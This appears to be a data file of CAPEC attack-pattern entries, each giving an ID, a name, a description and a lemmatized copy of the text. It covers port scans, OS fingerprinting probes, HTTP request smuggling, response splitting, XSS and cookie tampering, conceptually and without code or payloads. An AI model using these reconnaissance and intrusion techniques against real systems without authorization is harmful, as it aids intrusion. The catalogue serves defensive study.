CAPEC-304,TCP Null Scan,"An adversary uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets.In addition to being fast, the major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. NULL packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, NULL scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, NULL scans are flagged by almost all intrusion prevention or intrusion detection systems.",adversary use tcp null scan determine port closed target machine scan type accomplish send tcp segment flag packet header generate packet illegal base rfc rfc expected behavior tcp segment state flag send open port discard segment state flag send closed port handle rst response behavior allow attacker scan closed port send certain type rule break packet sync disallow tcb detect closed port rst packet addition fast major advantage scan type ability scan stateless firewall acl filter filter configure block access port usually prevent syn packet stop attempt build connection null packet like state fin ack packet tend pass device undetected additionally open port infer response generate distinguish open port filter port analysis instance null scan system protect stateful firewall indicate port open obvious rule break nature null scan flag intrusion prevention intrusion detection system
CAPEC-305,TCP ACK Scan,"An adversary uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present.When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered. When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port. When combined with SYN techniques an attacker can gain a more complete picture of which types of packets get through to a host and thereby map out its firewall rule-set. ACK scanning, when combined with SYN scanning, also allows the adversary to analyze whether a firewall is stateful or non-stateful (described in notes). TCP ACK Scans are somewhat faster and more stealthy than other types of scans but often requires rather sophisticated analysis by an experienced person. A skilled adversary may use this method to map out firewall rules, but the results of ACK scanning will be less useful to a novice.",adversary use tcp ack segment gather information firewall acl configuration purpose type scan discover information filter configuration port state type scanning rarely useful combine syn scanning give complete picture type firewall rule present tcp ack segment send closed port send sync listen port rfc expect behavior device respond rst get rst response ack scan give attacker useful information infer type firewall present stateful firewall discard sync ack packet lead response occur port mark filter rst receive response port mark unfiltered ack packet solicit expect behavior port combine syn technique attacker gain complete picture type packet host map firewall rule set ack scanning combine syn scanning allow adversary analyze firewall stateful non stateful describe note tcp ack scan somewhat fast stealthy type scan require sophisticated analysis experienced person skilled adversary use method map firewall rule result ack scanning useful novice
CAPEC-306,TCP Window Scan,"An adversary engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. While TCP Window Scans are fast and relatively stealthy, they work against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port. TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. It is a generally more reliable means of making inference about operating system versions than port status.",adversary engage tcp window scanning analyze port status operating system type tcp window scanning use ack scanning method examine tcp window size field response rst packet certain inference tcp window scans fast relatively stealthy work few tcp stack implementation type scan operate system return positive tcp window size rst packet send open port negative value rst originate closed port tcp window scanning complex scan type result difficult interpret window scanning rarely yield useful information combine type scanning useful generally reliable means make inference operate system version port status
CAPEC-307,TCP RPC Scan,"An adversary scans for RPC services listing on a Unix/Linux host.This type of scan can be obtained via native operating system utilities or via port scanners like nmap. When performed by a scanner, an RPC datagram is sent to a list of UDP ports and the response is recorded. Particular types of responses can be indicative of well-known RPC services running on a UDP port. Discovering RPC services gives the adversary potential targets to attack, as some RPC services are insecure by default.Direct RPC scans that bypass portmapper/sunrpc are typically slow compare to other scan types, are easily detected by IPS/IDS systems, and can only detect open ports when an RPC service responds. ICMP diagnostic message responses can help identify closed ports, however filtered and unfiltered ports cannot be identified through TCP RPC scans. There are two general approaches to RPC scanning: One is to use a native operating system utility, or script, to query the portmapper/rpcbind application running on port 111. Portmapper will return a list of registered RPC services. Alternately, one can use a port scanner or script to scan for RPC services directly.",adversary scan rpc service list unix linux host type scan obtain native operate system utility port scanner like nmap perform scanner rpc datagram send list udp port response record particular type response indicative know rpc service run udp port discover rpc service give adversary potential target attack rpc service insecure default direct rpc scan bypass portmapper sunrpc typically slow compare scan type easily detect ips ids system detect open port rpc service respond icmp diagnostic message response help identify closed port filtered unfiltered port identify tcp rpc scan general approach rpc scanning use native operate system utility script query portmapper rpcbind application run port portmapper return list register rpc service alternately use port scanner script scan rpc service directly
CAPEC-308,UDP Scan,"An adversary engages in UDP scanning to gather information about UDP port status on the target system. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port.During a UDP scan, a datagram is sent to a target port. If an 'ICMP Type 3 Port unreachable' error message is returned then the port is considered closed. Different types of ICMP messages can indicate a filtered port. UDP scanning is slower than TCP scanning. The protocol characteristics of UDP make port scanning inherently more difficult than with TCP, as well as dependent upon ICMP for accurate scanning. Due to ambiguities that can arise between open ports and filtered ports, UDP scanning results often require a high degree of interpretation and further testing to refine. In general, UDP scanning results are less reliable or accurate than TCP-based scanning.",adversary engage udp scanning gather information udp port status target system udp scanning method involve send udp datagram target port look evidence port close open udp port usually respond udp datagram stateful mechanism protocol require build establish session response udp datagram application specific rely method detect open port udp scanning rely heavily icmp diagnostic message order determine status remote port udp scan datagram send target port icmp type port unreachable error message return port consider closed different type icmp message indicate filter port udp scanning slow tcp scanning protocol characteristic udp port scanning inherently difficult tcp dependent icmp accurate scanning ambiguity arise open port filter port udp scanning result require high degree interpretation testing refine general udp scanning result reliable accurate tcp base scanning
CAPEC-309,Network Topology Mapping,"An adversary engages in scanning activities to map network nodes, hosts, devices, and routes. Adversaries usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.",adversary engage scan activity map network node host device route adversary usually perform type network reconnaissance early stage attack external network type scan utility typically employ include icmp tool network mapper port scanner route testing utility traceroute
CAPEC-31,Accessing/Intercepting/Modifying HTTP Cookies,"This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.",attack rely use http cookie store credential state information critical datum client system different form attack form attack involve access http cookie potentially sensitive datum contain second form involve intercept data transmit client server intercept information adversary impersonate remote user session form cookie content modify adversary send server adversary seek convince target server operate falsify information
CAPEC-310,Scanning for Vulnerable Software,"An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.",attacker engage scan activity find vulnerable software version type operating system version network service vulnerable exploitable network configuration improperly firewalle system misconfigure system dmz external network provide window opportunity attacker common type vulnerable software include unpatched operate system service ftp telnet smtp snmp run open port attacker identify attacker usually begin probe vulnerable software external network port scan potential target reveal
CAPEC-312,Active OS Fingerprinting,"An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.",adversary engage activity detect operate system firmware version remote target interrogate device server platform probe design solicit behavior reveal information operate system firmware environment operating system detection possible implementation common protocol ip tcp differ distinct way implementation difference sufficient break compatibility protocol difference detectable target respond unique way specific probe activity break semantic logical rule packet construction protocol different operate system unique response anomalous input provide basis fingerprint os behavior type os fingerprinting distinguish operating system type version
CAPEC-313,Passive OS Fingerprinting,"An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.",adversary engage activity detect version type os software environment passively monitor communication device node application passive technique operate system detection send actual probe target monitor network client server communication node order identify operate system base observe behavior compare database know signature value passive os fingerprinting usually reliable active method generally well able evade detection
CAPEC-317,IP ID Sequencing Probe,"This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis - IP 'ID' Sequencing: analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host and Shared IP 'ID' Sequencing: analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.",os fingerprinting probe analyze ip id field sequence number generation algorithm remote host operate system generate ip id number differently allow attacker identify operate system host examine assign id number generate response packet rfc specify id number choose range id sequence generation differ implementation implementation kind ip id sequence number analysis ip id sequencing analyze ip id sequence generation algorithm protocol host shared ip id sequencing analyze packet ordering ip id value span multiple protocol icmp tcp
CAPEC-318,IP 'ID' Echoed Byte-Order Probe,This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.,os fingerprinting probe test determine remote host echo ip id value probe packet attacker send udp datagram arbitrary ip id value closed port remote host observe manner bit echo icmp error message identification field id typically utilize reassemble fragmented packet operating system router firmware reverse bit order id field echo ip header portion original datagram icmp error message
CAPEC-319,IP (DF) 'Don't Fragment Bit' Echoing Probe,This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.,os fingerprinting probe test determine remote host echo ip df fragment bit response packet attacker send udp datagram df bit set closed port remote host observe df bit set response packet operating system echo bit icmp error message zero bit response packet
CAPEC-32,XSS Through HTTP Query Strings,An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.,adversary embed malicious script code parameter http query string convince victim submit http request contain query string vulnerable web application web application procede use value parameter properly validation generate html code execute victim browser
CAPEC-320,TCP Timestamp Probe,"This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.",os fingerprinting probe examine remote server implementation tcp timestamp operate system implement timestamp tcp header timestamp provide attacker means guess operate system target attacker begin probe active tcp service order response contain tcp timestamp different operating system update timestamp value different interval type analysis accurate multiple timestamp response receive analyze tcp timestamp find tcp option field tcp header
CAPEC-321,TCP Sequence Number Probe,"This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows: 1) the Sequence Number generated by the target is Zero, 2) the Sequence Number generated by the target is the same as the acknowledgement number in the probe, 3) the Sequence Number generated by the target is the acknowledgement number plus one, or 4) the Sequence Number is any other non-zero number.",os fingerprinting probe test target system assignment tcp sequence number common way test tcp sequence number generation send probe packet open port target compare sequence number generate target relate acknowledgement number probe packet different operate system assign sequence numbers differently fingerprint operate system obtain categorize relationship acknowledgement number sequence number follow sequence number generate target zero sequence number generate target acknowledgement number probe sequence number generate target acknowledgement number plus sequence number non zero number
CAPEC-322,TCP (ISN) Greatest Common Divisor Probe,This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.,os fingerprinting probe send number tcp syn packet open port remote machine initial sequence number isn syn ack response packet analyze determine small number target host use incremente sequence number information useful identify operate system particular operate system version increment sequence number different value result analysis compare database os behavior determine os type version
CAPEC-323,TCP (ISN) Counter Rate Probe,This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.,os detection probe measure average rate initial sequence number increment period time sequence number incremente time base algorithm susceptible timing analysis determine number increment unit time result analysis compare database operate system version determine likely operation system match
CAPEC-324,TCP (ISN) Sequence Predictability Probe,"This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.",type operating system probe attempt determine estimate predictable sequence number generation algorithm remote host statistical technique standard deviation determine predictable sequence number generation system result compare database operating system behavior determine likely match operating system version
CAPEC-325,TCP Congestion Control Flag (ECN) Probe,"This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.",os fingerprinting probe check remote host support explicit congestion notification ecn messaging ecn messaging design allow router notify remote host signal congestion problem occur explicit congestion notification messaging define rfc different operating system version implement ecn notification respond uniquely particular ecn flag type
CAPEC-326,TCP Initial Window Size Probe,"This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the ""connected"" state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.",os fingerprinting probe check initial tcp window size tcp stack limit range sequence number allowable session maintain connect state tcp protocol logic initial window size specify range acceptable sequence number qualify response ack packet session operate system use different initial window size initial window size sample establish ordinary tcp connection
CAPEC-327,TCP Options Probe,"This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.",os fingerprinting probe analyze type order tcp header option present response segment operate system use unique ordering different option set option present rfc specify require order option present different implementation use unique way order structure tcp option tcp option generate ordinary tcp traffic
CAPEC-328,TCP 'RST' Flag Checksum Probe,This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.,os fingerprinting probe perform checksum ascii datum contain data portion rst packet operating system report human readable text message payload rst reset packet specific type connection error occur rfc allow text payload reset packet operating system router implement functionality
CAPEC-329,ICMP Error Message Quoting Probe,"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or ""Quoted"" from the originating request that generated the ICMP error message.For this purpose ""Port Unreachable"" error messages are often used, as generating them requires the adversary to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply.This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: ""Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...]."" This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because ""older"" or ""legacy"" stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data.",adversary use technique generate icmp error message port unreachable destination unreachable redirect source quench time exceed parameter problem target analyze datum return quote originate request generate icmp error message purpose port unreachable error message generate require adversary send udp datagram closed port target goal analysis inference type operating system firmware send error message reply useful identify unique characteristic operating system expect behavior read icmp error message include internet header data octet datagram trigger error octet send contrast expect behavior limit quote text bit octet give latitude specification result stack implementation respond high degree variability datum quote error message old legacy stack comply specification stack choose long format accordance general rule operate system firmware quote byte datagram trigger error ip stack quote byte datum
CAPEC-33,HTTP Request Smuggling,"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages using various HTTP headers, request-line and body parameters as well as message sizes (denoted by the end of message signaled by a given HTTP header) by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).See CanPrecede relationships for possible consequences.A maliciously crafted HTTP request, which contains a second secretly embedded HTTP request is interpreted by an intermediary web proxy as single benign HTTP request, is forwarded to a back-end server, that interprets and parses the HTTP request as two authorized benign HTTP requests bypassing security controls.This attack usually involves the misuse of the HTTP headers: Content-Length and Transfer-Encoding. These abuses are discussed in RFC 2616 #4.4.3 and section #4.2 and are related to ordering and precedence of these headers. [REF-38]Additionally this attack can be performed through modification and/or fuzzing of parameters composing the request-line of HTTP messages.This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions in the HTTP agents.This differs from CAPEC-273 HTTP Response Smuggling, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Smuggling is an attempt to compromise aback-end HTTP agentvia HTTP Request messages.HTTP Splitting (CAPEC-105 and CAPEC-34) is different from HTTP Smuggling due to the fact that during implementation of asynchronous requests, HTTP Splitting requires the embedding/injection of arbitrary HTML headers and content through user input into browser cookies or Ajax web/browser object parameters like XMLHttpRequest.",adversary abuse flexibility discrepancy parsing interpretation http request message http header request line body parameter message size denote end message signal give http header different intermediary http agent load balancer reverse proxy web caching proxy application firewall etc secretly send unauthorized malicious http request end http agent web canprecede relationship possible consequence maliciously craft http request contain second secretly embed http request interpret intermediary web proxy single benign http request forward end server interpret parse http request authorize benign http request bypass security control attack usually involve misuse http header content length transfer encoding abuse discuss rfc section relate ordering precedence header attack perform modification fuzzing parameter compose request line http message attack usually result usage outdated incompatible http protocol version http agent differ http response smuggling usually attempt compromise client agent web browser send malicious content http response end http infrastructure http request smuggling attempt compromise aback end http agentvia http request message http splitting different http smuggling fact implementation asynchronous request http splitting require embedding injection arbitrary html header content user input browser cookie ajax web browser object parameter like xmlhttprequest
CAPEC-330,ICMP Error Message Echoing Integrity Probe,"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or ""Quoted"" from the originating request that generated the error message.A tremendous amount of information about the host operating system can be deduced from its 'echoing' characteristics. Notably, inspection of key protocol header fields, including the echoed header fields of the encapsulating protocol can yield a wealth of data about the host operating system or firmware version.For this purpose ""Port Unreachable"" error messages are often used, as generating them requires the adversary to send a UDP datagram to a closed port on the target. When replying with an ICMP error message some IP/ICMP stack implementations change aspects of the IP header, change or reverse certain byte orders, reset certain field values to default values which differ between operating system and firmware implementations, and make other changes. Some IP/ICMP stacks are decidedly broken, indicating an idiosyncratic behavior that differs from the RFC specifications, such as the case when miscalculations affect a field value.",adversary use technique generate icmp error message port unreachable destination unreachable redirect source quench time exceed parameter problem target analyze integrity datum return quote originate request generate error message tremendous information host operate system deduce echo characteristic notably inspection key protocol header field include echo header field encapsulate protocol yield wealth datum host operate system firmware version purpose port unreachable error message generate require adversary send udp datagram closed port target reply icmp error message ip icmp stack implementation change aspect ip header change reverse certain byte order reset certain field value default value differ operating system firmware implementation change ip icmp stack decidedly broken indicate idiosyncratic behavior differ rfc specification case miscalculation affect field value
CAPEC-331,ICMP IP Total Length Field Probe,"An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable"" error message. This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart: 1) the IP total length field may be calculated correctly, 2) an operating system may add 20 or more additional bytes to the length calculation, 3) the operating system may subtract 20 or more bytes from the correct length of the field or 4) the IP total length field is calculated with any other incorrect value.",adversary send udp packet closed port target machine solicit ip header total length field value echo port unreachable error message type behavior useful build signature base operating system response particularly error message contain type information useful identify specific operate system response specify header request echo error send response operating system firmware alter integrity original header non standard icmp ip implementation result response useful individuate remote operate system router firmware version general response type distinguish operate system apart ip total length field calculate correctly operate system add additional byte length calculation operate system subtract byte correct length field ip total length field calculate incorrect value
CAPEC-332,ICMP IP 'ID' Field Error Message Probe,"An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. This allows the attacker to construct a fingerprint of specific OS behaviors.The internet identification field (ID) is typically utilized for reassembling a fragmented packet. RFC791 and RFC815 discusses about IP datagrams, fragmentation and reassembly. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within the ICMP error message. There are three behaviors related to the IP ID field that can be used to distinguish remote operating systems or firmware: 1) it is echoed back identically to the bit order of the ID field in the original IP header, 2) it is echoed back, but the byte order has been reversed, or it contains an incorrect or unexpected value. Different operating systems will respond by setting the IP ID field differently within error messaging.",adversary send udp datagram have assign value internet identification field id closed port target observe manner bit echo icmp error message allow attacker construct fingerprint specific os behavior internet identification field id typically utilize reassemble fragment packet discuss ip datagram fragmentation reassembly operating system router firmware reverse bit order id field echo ip header portion original datagram icmp error message behavior relate ip id field distinguish remote operate system firmware echo identically bit order id field original ip header echo byte order reverse contain incorrect unexpected value different operating system respond set ip id field differently error messaging
CAPEC-34,HTTP Response Splitting,"An adversary manipulates and injects malicious content, in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., web server) or into an already spoofed HTTP response from an adversary controlled domain/site.See CanPrecede relationships for possible consequences.Malicious user input is injected into various standard and/or user defined HTTP headers within a HTTP Response through use of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters, and unique character encoding.A single HTTP response ends up being split as two or more HTTP responses by the targeted client HTTP agent parsing the original maliciously manipulated HTTP response. This allows malicious HTTP responses to bypass security controls in order to implement malicious actions and provide malicious content that allows access to sensitive data and to compromise applications and users. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.This differs from CAPEC-105 HTTP Request Splitting, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Splitting is an attempt to compromise aclient agent (e.g., web browser)by sending malicious content in HTTP responses from back-end HTTP infrastructure.HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques.",adversary manipulate inject malicious content form secret unauthorized http response single http response vulnerable compromised end http agent web server spoof http response adversary control domain site canprecede relationship possible consequence malicious user input inject standard user define http header http response use carriage return cr line feed lf horizontal tab ht space sp character valid rfc compliant special character unique character encoding single http response end split http response target client http agent parse original maliciously manipulate http response allow malicious http response bypass security control order implement malicious action provide malicious content allow access sensitive datum compromise application user perform abuse interpretation parsing discrepancy different intermediary http agent load balancer reverse proxy web caching proxy application firewall etc client http agent web browser path malicious http response attack usually result usage outdated incompatible http protocol version lack syntax checking filtering user input http agent receive http message path differ http request splitting usually attempt compromise end http agent http request message http response splitting attempt compromise aclient agent web send malicious content http response end http infrastructure http smuggling different http splitting fact rely discrepancy interpretation http header message size solely user input special character character encoding http smuggling establish circumvent mitigation http request splitting technique
CAPEC-35,Leverage Executable Code in Non-Executable Files,An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.,attack type exploit system trust configuration resource file executable load resource image file configuration file attacker modify file execute malicious code directly manipulate target process application server execute base malicious configuration parameter system increasingly interrelated mash resource local remote source possibility attack occur high
CAPEC-36,Using Unpublished Interfaces or Functionality,"An adversary searches for and invokes interfaces or functionality that the target system designers did not intend to be publicly available. If interfaces fail to authenticate requests, the attacker may be able to invoke functionality they are not authorized for.Adversaries can also search for undocumented bits on a hardware device, commonly known as ""chicken bits"". These bits are used to enable/disable certain functionality, but are not published. Adversaries can reverse engineer firmware to identify hidden features and change these bits at runtime to achieve malicious behavior.",adversary search invoke interface functionality target system designer intend publicly available interface fail authenticate request attacker able invoke functionality authorize adversary search undocumented bit hardware device commonly know chicken bit bit enable disable certain functionality publish adversary reverse engineer firmware identify hidden feature change bit runtime achieve malicious behavior
CAPEC-37,Retrieve Embedded Sensitive Data,"An attacker examines a target system to find sensitive data that has been embedded within it. This information can reveal confidential contents, such as account numbers or individual keys/credentials that can be used as an intermediate step in a larger attack.",attacker examine target system find sensitive datum embed information reveal confidential content account number individual key credential intermediate step large attack
CAPEC-38,Leveraging/Manipulating Configuration File Search Paths,"This pattern of attack sees an adversary load a malicious resource into a program's standard path so that when a known command is executed then the system instead executes the malicious component. The adversary can either modify the search path a program uses, like a PATH variable or classpath, or they can manipulate resources on the path to point to their malicious components. J2EE applications and other component based applications that are built from multiple binaries can have very long list of dependencies to execute. If one of these libraries and/or references is controllable by the attacker then application controls can be circumvented by the attacker.",pattern attack see adversary load malicious resource program standard path known command execute system instead execute malicious component adversary modify search path program use like path variable classpath manipulate resource path point malicious component application component base application build multiple binary long list dependency execute library reference controllable attacker application control circumvent attacker
CAPEC-383,Harvesting Information via API Event Monitoring,"An adversary hosts an event within an application framework and then monitors the data exchanged during the course of the event for the purpose of harvesting any important data leaked during the transactions. One example could be harvesting lists of usernames or userIDs for the purpose of sending spam messages to those users. One example of this type of attack involves the adversary creating an event within the sub-application. Assume the adversary hosts a ""virtual sale"" of rare items. As other users enter the event, the attacker records via AiTM (CAPEC-94) proxy the user_ids and usernames of everyone who attends. The adversary would then be able to spam those users within the application using an automated script.",adversary host event application framework monitor datum exchange course event purpose harvest important datum leak transaction example harvest list username userid purpose send spam message user example type attack involve adversary create event sub application assume adversary host virtual sale rare item user enter event attacker record aitm proxy username attend adversary able spam user application automate script
CAPEC-384,Application API Message Manipulation via Man-in-the-Middle,"An attacker manipulates either egress or ingress data from a client within an application framework in order to change the content of messages. Performing this attack can allow the attacker to gain unauthorized privileges within the application, or conduct attacks such as phishing, deceptive strategies to spread malware, or traditional web-application attacks. The techniques require use of specialized software that allow the attacker to perform adversary-in-the-middle (CAPEC-94) communications between the web browser and the remote system. Despite the use of AiTH software, the attack is actually directed at the server, as the client is one node in a series of content brokers that pass information along to the application framework. Additionally, it is not true ""Adversary-in-the-Middle"" attack at the network layer, but an application-layer attack the root cause of which is the master applications trust in the integrity of code supplied by the client.",attacker manipulate egress ingress datum client application framework order change content message perform attack allow attacker gain unauthorized privilege application conduct attack phishing deceptive strategy spread malware traditional web application attack technique require use specialized software allow attacker perform adversary middle communication web browser remote system despite use aith software attack actually direct server client node series content broker pass information application framework additionally true adversary middle attack network layer application layer attack root cause master application trust integrity code supply client
